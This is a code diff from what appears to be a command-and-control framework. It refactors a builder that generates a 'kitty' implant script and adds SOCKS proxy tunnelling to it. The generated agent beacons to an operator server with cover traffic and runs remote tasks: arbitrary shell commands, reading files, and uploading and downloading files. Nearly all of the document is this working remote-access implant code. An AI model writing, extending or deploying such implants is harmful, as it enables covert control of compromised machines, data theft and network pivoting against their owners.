@@ -7,44 +7,29 @@ from __future__ import annotations
 
 from typing import Optional
 
+from lib.c2.agent_spec import AgentSpec
 from lib.c2.beacon_profile import BeaconProfile
 from lib.c2.http_polling_agent import build_http_polling_agent_script
+from lib.c2.socks_implant import EMBEDDED_SOCKS_RUNTIME, SOCKS_TASK_HANDLERS
 
 
-def build_kitty_agent_script(
-    host: str,
-    port: int,
-    client_id: str,
-    *,
-    url_prefix: str = "/c2",
-    use_ssl: bool = False,
-    private_key_pem: Optional[str] = None,
-    profile: Optional[BeaconProfile] = None,
-    chain_token: str = "",
-    chain_listen_port: int = 0,
-    chain_listen_host: str = "0.0.0.0",
-) -> str:
-    """Build a typed-task agent (shell/ls/pwd/whoami/cat/download/upload).
-
-    Wire format: poll JSON may include ``encoding=task`` and ``task`` object.
-    Falls back to legacy shell-string ``command`` for compatibility.
-    """
-    # Start from classic polling agent then swap the command execution loop
+def build_kitty_agent_from_spec(spec: AgentSpec) -> str:
+    """Build a typed-task agent from a unified AgentSpec."""
+    profile = spec.profile or BeaconProfile()
     base = build_http_polling_agent_script(
-        host,
-        port,
-        client_id,
-        url_prefix=url_prefix,
-        use_ssl=use_ssl,
-        private_key_pem=private_key_pem,
+        spec.host,
+        spec.port,
+        spec.client_id,
+        url_prefix=spec.url_prefix,
+        use_ssl=spec.use_ssl,
+        private_key_pem=spec.private_key_pem,
         profile=profile,
-        chain_token=chain_token,
-        chain_listen_port=chain_listen_port,
-        chain_listen_host=chain_listen_host,
-        cover_traffic=bool(profile.cover_traffic) if profile else True,
+        chain_token=spec.chain_token,
+        chain_listen_port=spec.chain_listen_port,
+        chain_listen_host=spec.chain_listen_host,
+        cover_traffic=bool(profile.cover_traffic),
     )
 
-    # Replace the command execution block with a typed dispatcher
     old_exec = (
         "  cmd=''\n"
         "  if data.get('command'):\n"
@@ -61,7 +46,8 @@ def build_kitty_agent_script(
     )
 
     new_exec = (
-        "  def _run_task(task):\n"
+        EMBEDDED_SOCKS_RUNTIME
+        + "  def _run_task(task):\n"
         "   tid=str(task.get('task_id') or ''); cmd=str(task.get('command') or '').lower(); args=task.get('args') or {}\n"
         "   out=''; files=[]; status='completed'\n"
         "   try:\n"
@@ -84,10 +70,10 @@ def build_kitty_agent_script(
         "    elif cmd=='upload':\n"
         "     path=str(args.get('path') or ''); blob=str(args.get('data') or '')\n"
         "     open(path,'wb').write(base64.b64decode(blob)); out='OK wrote %s'%path\n"
-        "    elif cmd=='exit':\n"
+        + SOCKS_TASK_HANDLERS
+        + "    elif cmd=='exit':\n"
         "     out='bye'; return out,files,status,True\n"
         "    else:\n"
-        "     # legacy: treat command field as shell\n"
         "     c=str(task.get('command') or '')\n"
         "     p=subprocess.run(c,shell=True,capture_output=True,text=True,timeout=120)\n"
         "     out=(p.stdout or '')+(p.stderr or '') or ('[exit %s]'%p.returncode)\n"
@@ -114,6 +100,38 @@ def build_kitty_agent_script(
     )
 
     if old_exec not in base:
-        # Fallback: append typed runner note — shouldn't happen
         return base + "\n# typed agent patch missing\n"
     return base.replace(old_exec, new_exec, 1)
+
+
+def build_kitty_agent_script(
+    host: str,
+    port: int,
+    client_id: str,
+    *,
+    url_prefix: str = "/c2",
+    use_ssl: bool = False,
+    private_key_pem: Optional[str] = None,
+    profile: Optional[BeaconProfile] = None,
+    chain_token: str = "",
+    chain_listen_port: int = 0,
+    chain_listen_host: str = "0.0.0.0",
+) -> str:
+    """Build a typed-task agent (shell/ls/pwd/whoami/cat/download/upload/socks).
+
+    Wire format: poll JSON may include ``encoding=task`` and ``task`` object.
+    Falls back to legacy shell-string ``command`` for compatibility.
+    """
+    spec = AgentSpec(
+        host=host,
+        port=port,
+        client_id=client_id,
+        url_prefix=url_prefix,
+        use_ssl=use_ssl,
+        private_key_pem=private_key_pem,
+        profile=profile,
+        chain_token=chain_token,
+        chain_listen_port=chain_listen_port,
+        chain_listen_host=chain_listen_host,
+    )
+    return build_kitty_agent_from_spec(spec)
